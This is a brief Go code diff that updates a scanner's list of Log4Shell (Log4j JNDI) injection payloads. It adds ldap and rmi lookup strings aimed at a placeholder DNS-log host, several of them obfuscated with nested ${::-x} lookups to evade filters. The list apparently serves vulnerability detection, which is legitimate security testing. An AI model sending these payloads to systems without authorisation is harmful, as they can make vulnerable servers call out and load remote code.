@@ -2,7 +2,9 @@ package log4j
 
 var (
 	log4jJndiPayloads = []string{
-		"${${::-j}ndi:rmi://dnslog-url}",
-		"${DATE:${${::-J}n${::-D}i:${::-l}d${::-a}p:${::-/}${::-/}dnslog-url}}",
+		"${jndi:ldap://dnslog-url}",
+		"${jndi:ldap:${::-/}${::-/}dnslog-url}",
+		"${${X::-j}ndi:rmi:${::-/}${X::-/}dnslog-url}",
+		"${XXX:${${X::-jn}${X::-di}:${X::-l}d${X::-a}p:${X::-/}${X::-/}dnslog-url}}",
 	}
 )
